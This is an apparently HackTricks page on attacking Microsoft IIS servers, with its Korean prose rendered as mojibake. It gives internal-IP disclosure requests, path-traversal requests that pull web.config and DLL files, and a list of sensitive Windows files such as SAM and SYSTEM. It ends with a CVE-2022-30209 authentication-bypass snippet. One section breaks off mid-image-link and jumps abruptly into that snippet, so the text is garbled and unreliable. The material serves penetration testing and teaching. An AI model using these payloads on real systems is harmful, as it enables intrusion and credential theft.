# IIS - ì¸í„°ë„· ì •ë³´ ì„œë¹„ìŠ¤

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ **HackTricks Cloud** github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°êµë¥¼ ê³µìœ í•˜ì„¸ìš”.

</details>

í…ŒìŠ¤íŠ¸ ê°€ëŠ¥í•œ ì‹¤í–‰ íŒŒì¼ í™•ì¥ì:

* asp
* aspx
* config
* php

## ë‚´ë¶€ IP ì£¼ì†Œ ë…¸ì¶œ

302ë¥¼ ë°›ëŠ” ëª¨ë“  IIS ì„œë²„ì—ì„œ Host í—¤ë”ë¥¼ ì œê±°í•˜ê³  HTTP/1.0ì„ ì‚¬ìš©í•´ë³´ì„¸ìš”. ì‘ë‹µ ë‚´ì˜ Location í—¤ë”ëŠ” ë‚´ë¶€ IP ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
ì‘ë‹µì€ ë‚´ë¶€ IPë¥¼ ê³µê°œí•©ë‹ˆë‹¤:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## .config íŒŒì¼ ì‹¤í–‰

.config íŒŒì¼ì„ ì—…ë¡œë“œí•˜ê³  ì½”ë“œë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ìˆ˜í–‰í•˜ëŠ” í•œ ê°€ì§€ ë°©ë²•ì€ HTML ì£¼ì„ ë‚´ì— ì½”ë“œë¥¼ íŒŒì¼ ëì— ì¶”ê°€í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤: [ì—¬ê¸°ì—ì„œ ì˜ˆì œ ë‹¤ìš´ë¡œë“œ](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

ì´ ì·¨ì•½ì ì„ ì•…ìš©í•˜ê¸° ìœ„í•œ ìì„¸í•œ ì •ë³´ì™€ ê¸°ìˆ ì€ [ì—¬ê¸°](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## IIS íƒìƒ‰ ë¸Œë£¨íŠ¸í¬ìŠ¤

ë‹¤ìŒ ëª©ë¡ì„ ë‹¤ìš´ë¡œë“œí•˜ì„¸ìš”:

{% file src="../../.gitbook/assets/iisfinal.txt" %}

ì´ ëª©ë¡ì€ ë‹¤ìŒ ëª©ë¡ì˜ ë‚´ìš©ì„ ë³‘í•©í•˜ì—¬ ìƒì„±ë˜ì—ˆìŠµë‹ˆë‹¤:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

í™•ì¥ìë¥¼ ì¶”ê°€í•˜ì§€ ì•Šê³  ì‚¬ìš©í•˜ì‹­ì‹œì˜¤. í•„ìš”í•œ íŒŒì¼ì€ ì´ë¯¸ í™•ì¥ìê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

## ê²½ë¡œ ìˆœíšŒ

### ì†ŒìŠ¤ ì½”ë“œ ë…¸ì¶œ

ì „ì²´ ì„¤ëª…ì€ ë‹¤ìŒì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
ìš”ì•½í•˜ìë©´, ì‘ìš© í”„ë¡œê·¸ë¨ì˜ í´ë” ë‚´ì— "**assemblyIdentity**" íŒŒì¼ê³¼ "**namespaces**"ì— ëŒ€í•œ ì°¸ì¡°ê°€ í¬í•¨ëœ ì—¬ëŸ¬ web.config íŒŒì¼ì´ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ **ì‹¤í–‰ íŒŒì¼ì´ ìœ„ì¹˜í•œ ê³³ì„ ì•Œ ìˆ˜** ìˆìœ¼ë©°, ì´ë¥¼ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìš´ë¡œë“œí•œ Dllì—ì„œëŠ” ìƒˆë¡œìš´ **namespaces**ë¥¼ ì°¾ì„ ìˆ˜ë„ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì ‘ê·¼í•˜ê³  web.config íŒŒì¼ì„ ì–»ì–´ ìƒˆë¡œìš´ namespacesì™€ assemblyIdentityë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë˜í•œ, **connectionstrings.config**ì™€ **global.asax** íŒŒì¼ì—ëŠ” í¥ë¯¸ë¡œìš´ ì •ë³´ê°€ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
{% endhint %}

**.Net MVC ì• í”Œë¦¬ì¼€ì´ì…˜**ì—ì„œëŠ” **web.config** íŒŒì¼ì´ **"assemblyIdentity"** XML íƒœê·¸ë¥¼ í†µí•´ ì‘ìš© í”„ë¡œê·¸ë¨ì´ ì˜ì¡´í•˜ëŠ” ê° ì´ì§„ íŒŒì¼ì„ ì§€ì •í•˜ëŠ” ì¤‘ìš”í•œ ì—­í• ì„ í•©ë‹ˆë‹¤.

### **ì´ì§„ íŒŒì¼ íƒìƒ‰**

ì•„ë˜ëŠ” **web.config** íŒŒì¼ì— ì•¡ì„¸ìŠ¤í•˜ëŠ” ì˜ˆì‹œì…ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
ì´ ìš”ì²­ì€ ë‹¤ì–‘í•œ ì„¤ì •ê³¼ ì¢…ì†ì„±ì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤:

- **EntityFramework** ë²„ì „
- ì›¹í˜ì´ì§€, í´ë¼ì´ì–¸íŠ¸ ìœ íš¨ì„± ê²€ì‚¬ ë° JavaScriptì— ëŒ€í•œ **AppSettings**
- ì¸ì¦ ë° ëŸ°íƒ€ì„ì„ ìœ„í•œ **System.web** êµ¬ì„±
- **System.webServer** ëª¨ë“ˆ ì„¤ì •
- **Microsoft.Owin**, **Newtonsoft.Json**, **System.Web.Mvc**ì™€ ê°™ì€ ë‹¤ì–‘í•œ ë¼ì´ë¸ŒëŸ¬ë¦¬ì— ëŒ€í•œ **Runtime** ì–´ì…ˆë¸”ë¦¬ ë°”ì¸ë”©

ì´ëŸ¬í•œ ì„¤ì •ì€ **/bin/WebGrease.dll**ê³¼ ê°™ì€ íŠ¹ì • íŒŒì¼ì´ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ /bin í´ë”ì— ìœ„ì¹˜í•´ ìˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

### **ë£¨íŠ¸ ë””ë ‰í† ë¦¬ íŒŒì¼**

**/global.asax** ë° **/connectionstrings.config** (ë¯¼ê°í•œ ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨)ì™€ ê°™ì€ ë£¨íŠ¸ ë””ë ‰í† ë¦¬ì— ìˆëŠ” íŒŒì¼ì€ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ êµ¬ì„±ê³¼ ì‘ë™ì— í•„ìˆ˜ì ì…ë‹ˆë‹¤.

### **ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì™€ Web.Config**

MVC ì‘ìš© í”„ë¡œê·¸ë¨ì€ ê° íŒŒì¼ì—ì„œ ë°˜ë³µì ì¸ ì„ ì–¸ì„ í”¼í•˜ê¸° ìœ„í•´ íŠ¹ì • ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ëŒ€í•œ ì¶”ê°€ **web.config íŒŒì¼**ì„ ì •ì˜í•©ë‹ˆë‹¤. ì´ëŠ” ë‹¤ë¥¸ **web.config**ë¥¼ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ìš”ì²­ì„ í†µí•´ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **DLL ë‹¤ìš´ë¡œë“œ**

ì‚¬ìš©ì ì •ì˜ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ì— ëŒ€í•œ ì–¸ê¸‰ì€ /bin ë””ë ‰í† ë¦¬ì— ìˆëŠ” "**WebApplication1**"ì´ë¼ëŠ” DLLì„ ì•”ì‹œí•©ë‹ˆë‹¤. ì´ì–´ì„œ **WebApplication1.dll**ì„ ë‹¤ìš´ë¡œë“œí•˜ëŠ” ìš”ì²­ì´ í‘œì‹œë©ë‹ˆë‹¤:
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
ì´ëŠ” /bin ë””ë ‰í† ë¦¬ì— **System.Web.Mvc.dll** ë° **System.Web.Optimization.dll**ê³¼ ê°™ì€ ë‹¤ë¥¸ í•„ìˆ˜ DLLì´ ì¡´ì¬í•  ê°€ëŠ¥ì„±ì„ ì‹œì‚¬í•©ë‹ˆë‹¤.

DLLì´ **WebApplication1.Areas.Minded**ë¼ëŠ” ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ê°€ì ¸ì˜¬ ê²½ìš°, ê³µê²©ìëŠ” **/area-name/Views/**ì™€ ê°™ì€ ì˜ˆì¸¡ ê°€ëŠ¥í•œ ê²½ë¡œì— ë‹¤ë¥¸ web.config íŒŒì¼ì˜ ì¡´ì¬ë¥¼ ì¶”ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ë“¤ì€ íŠ¹ì • êµ¬ì„± ë° /bin í´ë”ì˜ ë‹¤ë¥¸ DLLì— ëŒ€í•œ ì°¸ì¡°ë¥¼ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, **/Minded/Views/web.config**ë¡œì˜ ìš”ì²­ì€ ë‹¤ë¥¸ DLLì¸ **WebApplication1.AdditionalFeatures.dll**ì˜ ì¡´ì¬ë¥¼ ë‚˜íƒ€ë‚´ëŠ” êµ¬ì„± ë° ë„¤ì„ìŠ¤í˜ì´ìŠ¤ë¥¼ ë…¸ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì¼ë°˜ì ì¸ íŒŒì¼

[ì—¬ê¸°](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)ì—ì„œë¶€í„°
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 ì˜¤ë¥˜

ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ í‘œì‹œë˜ë©´:

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì„ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)ì„ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **Hacking íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>
